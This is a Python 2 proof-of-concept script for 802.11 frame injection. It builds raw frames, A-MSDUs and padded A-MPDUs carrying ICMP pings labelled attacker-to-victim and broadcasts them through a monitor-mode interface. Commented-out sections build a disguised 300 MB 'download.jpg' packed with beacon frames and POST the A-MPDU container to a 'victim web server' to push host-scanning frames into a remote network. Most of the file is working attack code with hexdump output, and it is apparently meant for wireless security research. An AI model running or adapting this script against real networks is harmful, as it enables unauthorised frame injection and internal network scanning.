#!/usr/bin/env python2

from rpyutils import printd, Color, Level, clr, VERBOSITY
from packets import Dot11Packet, AMPDUPacket, AMSDUPacket, ping_packet, arp_packet, tcp_syn, ssid_packet, probe_response
import requests
import random
import sys
#this is useful to dump packets in hex mode
import hexdump
import time

class MaliciousDownload():
    def __init__(self, package):
        self.data = str(package)

    def write(self):
        with open('download.jpg', 'w') as f:
            for i in range(0, 10000):
                f.write(("\x00" * random.randint(0, 3)) + str(self.data))


def fuzztf(option1, option2):
    test = random.randint(0, 1)
    if test:
        return option1
    else:
        return option2

"""
def main_download():
    # Malicious download
    raw_input("This will create a 300 MB file download.jpg in the working directory. Press any key to continue or CTRL+C to exit.")
    printd(clr(Color.YELLOW, "Creating malicious download..."), Level.INFO)
    container = ""
    for i in range(0, 256):
        # Containers are (series of) frames to inject into the remote network
        # Container for scanning hosts on internal network
        #md_pkt = AMPDUPacket('ff:ff:ff:ff:ff:ff', '4C:5E:0C:9E:82:19', '4C:5E:0C:9E:82:19', 0x02)
        #md_pkt.add_msdu(ping_packet(i, "10.0.0.1", "192.168.88.249"))
        #md_pkt.add_padding(8)

        # Container for a Beacon frame
        md_pkt = ssid_packet()

        container += str(md_pkt)

    md = MaliciousDownload(container)
    md.write()
"""
def main():
    count = 1
    ip_count = 1

    # send the packet a number of times
    for i in range(0, 10):
        count = (count + 1) % 1024
        ip_count = (ip_count % 255) + 1

        # Ping from attacker --> victim
        # You need to change the MAC addresses and IPs to match the remote AP
        pkt = Dot11Packet('ff:ff:ff:ff:ff:ff', '64:D1:A3:3D:26:5B', '64:D1:A3:3D:26:5B')

        printd(clr(Color.YELLOW, "Radiotap:"), Level.INFO)
        #sys.stdout.flush()
        hexdump.hexdump(str(pkt.rt))

        #for character in str(pkt.rt):
          # this prints "\x 00 \x 00 \x 12 \x 00 \x 2e \x 08 \x 00 \x 00 \x 00 \x 6c \x 6c \x 09 \x c0 \x 00 \x c0 \x 01 \x 00 \x 00 "  
          #print '\\x',character.encode('hex'),
        sys.stdout.flush()
        printd("", Level.INFO) #print a linefeed

        printd(clr(Color.YELLOW, "802.11 hdr:"), Level.INFO)
        #sys.stdout.flush()
        hexdump.hexdump(str(pkt.dot11hdr))
        sys.stdout.flush()

        # add an MSDU 
        pkt.add_msdu(ping_packet(count, "10.0.0.1", "192.168.0." + str(ip_count)))
        printd(clr(Color.YELLOW, "MSDU added:"), Level.INFO)
        #sys.stdout.flush()
        hexdump.hexdump(str(ping_packet(count, "10.0.0.1", "192.168.0." + str(ip_count))))
        sys.stdout.flush()

        printd(clr(Color.YELLOW, "Radiotap + 802.11 hdr + MSDU + CRC:"), Level.INFO)
        #sys.stdout.flush()
        hexdump.hexdump(str(pkt.data))
        sys.stdout.flush()

        #for character in str(pkt.data):
              # this prints "\x 80 \x 04 \x bb \x 4e \x 88 \x 02 \x 00 \x 00 \x ff \x ff \x ff \x ff \x ff \x ff \x 64 "
            #print "\\x",character.encode('hex'),    #does not work in python3
            #print character, character.encode('hex'),
        printd("", Level.INFO) #print a linefeed

        # send the packet
        pkt.send()    #the interface has to be in monitor mode
        printd("packet sent", Level.INFO)
        time.sleep(0.1)

# send packets with a number of MSDU (A-MSDU)
def main_amsdu():
    count = 1
    ip_count = 0

    count = (count + 1) % 1024
    ip_count = (ip_count % 255) + 1

    # Ping from attacker --> victim
    # You need to change the MAC addresses and IPs to match the remote AP
    amsdu_pkt = AMSDUPacket('ff:ff:ff:ff:ff:ff', '64:D1:A3:3D:26:5B', '64:D1:A3:3D:26:5B', 0x02)

    printd(clr(Color.YELLOW, "AMSDU Radiotap (rt):"), Level.INFO)
    #sys.stdout.flush()
    hexdump.hexdump(str(amsdu_pkt.rt))

    for character in str(amsdu_pkt.rt):
      # this prints "\x 00 \x 00 \x 12 \x 00 \x 2e \x 08 \x 00 \x 00 \x 00 \x 6c \x 6c \x 09 \x c0 \x 00 \x c0 \x 01 \x 00 \x 00 "  
      print "\\x",character.encode('hex'),   #does not work in python3
      sys.stdout.flush()
    printd("", Level.INFO) #print a linefeed

    printd(clr(Color.YELLOW, "AMSDU dot11hdr:"), Level.INFO)
    #sys.stdout.flush()
    hexdump.hexdump(str(amsdu_pkt.dot11hdr))
    sys.stdout.flush()

    # add an MSDU 
    amsdu_pkt.add_msdu(ping_packet(count, "10.0.0.1", "192.168.0." + str(ip_count)))
    printd(clr(Color.YELLOW, "AMPDU with the MSDU added:"), Level.INFO)
    #sys.stdout.flush()
    hexdump.hexdump(str(amsdu_pkt))
    sys.stdout.flush()

    printd(clr(Color.YELLOW, "AMSDU data:"), Level.INFO)
    #sys.stdout.flush()
    hexdump.hexdump(str(amsdu_pkt.data))
    sys.stdout.flush()

    for character in str(amsdu_pkt.data):
    	  # this prints "\x 80 \x 04 \x bb \x 4e \x 88 \x 02 \x 00 \x 00 \x ff \x ff \x ff \x ff \x ff \x ff \x 64 "
        print "\\x",character.encode('hex'),   #does not work in python3
        #print character, character.encode('hex'),
    printd("", Level.INFO) #print a linefeed

    # send the packet a number of times
    for i in range(0, 10):
        # send the packet
        amsdu_pkt.send()	#the interface has to be in monitor mode
        printd("AMSDU packet sent", Level.INFO)
        time.sleep(0.1)


# Connect to victim web server and POST malicious host scanning ICMP frames (push to victim)
def main_ampdu():
		# "Requests" Python library: http://docs.python-requests.org/en/master/user/advanced/
    #session = requests.Session()
    count = 1
    ip_count = 0

    printd(clr(Color.BLUE, "Building container..."), Level.INFO)
    """ Build container """
    container = ''
    for i in range(0, 2):
        count = (count + 1) % 1024
        ip_count = (ip_count % 255) + 1

        # Ping from attacker --> victim
        # You need to change the MAC addresses and IPs to match the remote AP
        ampdu_pkt = AMPDUPacket('ff:ff:ff:ff:ff:ff', '64:D1:A3:3D:26:5B', '64:D1:A3:3D:26:5B', 0x02)

        printd(clr(Color.YELLOW, "Radiotap (rt):"), Level.INFO)
        #sys.stdout.flush()
        hexdump.hexdump(str(ampdu_pkt.rt))

        for character in str(ampdu_pkt.rt):
          # this prints "\x 00 \x 00 \x 12 \x 00 \x 2e \x 08 \x 00 \x 00 \x 00 \x 6c \x 6c \x 09 \x c0 \x 00 \x c0 \x 01 \x 00 \x 00 "  
          print "\\x",character.encode('hex'),   #does not work in python3
          sys.stdout.flush()
        printd("", Level.INFO) #print a linefeed

        printd(clr(Color.YELLOW, "dot11hdr:"), Level.INFO)
        #sys.stdout.flush()
        hexdump.hexdump(str(ampdu_pkt.dot11hdr))
        sys.stdout.flush()

        # add an MSDU to the AMPDU
        ampdu_pkt.add_msdu(ping_packet(count, "10.0.0.1", "192.168.0." + str(ip_count)))
        printd(clr(Color.YELLOW, "AMPDU with the MSDU added:"), Level.INFO)
        #sys.stdout.flush()
        hexdump.hexdump(str(ampdu_pkt))
        sys.stdout.flush()

        ampdu_pkt.add_padding(8)
        printd(clr(Color.YELLOW, "AMPDU with MSDU and 8 padding delimiters added:"), Level.INFO)
        #sys.stdout.flush()
        hexdump.hexdump(str(ampdu_pkt))
        sys.stdout.flush()

        container += str(ampdu_pkt)

        # Beacon from attacker --> victim
        #ampdu_pkt = ssid_packet()
        #container += str(ampdu_pkt)

        # Ping from victim --> access point
        #ampdu_pkt = AMPDUPacket('4C:5E:0C:9E:82:19', 'f8:1a:67:1b:14:00', '4C:5E:0C:9E:82:19')
        #ampdu_pkt.add_msdu(ping_packet(count, "192.168.88.254", "10.0.0." + str(ip_count)))
        #ampdu_pkt.add_padding(8)
        #container += str(ampdu_pkt)
    """ end package """
    printd(clr(Color.BLUE, "Final A-MPDU built:"), Level.INFO)
    sys.stdout.flush()

    #hexdump.hexdump('\x00'*16)
    #hexdump.hexdump("Hello world")
    hexdump.hexdump(container)
    sys.stdout.flush()

    for character in container:
    	# this prints "\x 80 \x 04 \x bb \x 4e \x 88 \x 02 \x 00 \x 00 \x ff \x ff \x ff \x ff \x ff \x ff \x 64 "
        print "\\x",character.encode('hex'),   #does not work in python3
        #print character, character.encode('hex'),

    printd("", Level.INFO) #print a linefeed

    # send the packet a number of times
    for i in range(0, 10):
        # send the packet
        ampdu_pkt.send()	#the interface has to be in monitor mode
        printd("packet sent", Level.INFO)
        time.sleep(0.1)

    """
    while 1:
        print("."),
        sys.stdout.flush()
        request_params = {'postpayload': ("\x00" * random.randint(0, 3)) + str(container)}
        try:
            session.post("http://" + "10.0.0.6:80" + "/index.html", files=request_params, timeout=5)
        except requests.exceptions.ConnectionError:
            printd(clr(Color.RED, "Could not connect to host"), Level.CRITICAL)
            pass
        except Exception:
            printd(clr(Color.RED, "Another exception"), Level.CRITICAL)
            pass
    """

if __name__ == "__main__":
    try:
        pocnum = raw_input("option 1: send normal packets. "
                           "option 2: send AMSDUs. "
                           "option 3: send AMPDUs. "
                           "Choice: ")
        if pocnum == "1":
            main()
        elif pocnum == "2":
            main_amsdu()
        elif pocnum == "3":
            main_ampdu()
        else:
            printd("Invalid PoC number.", Level.CRITICAL)

    except KeyboardInterrupt:
        printd("\nExiting...", Level.INFO)
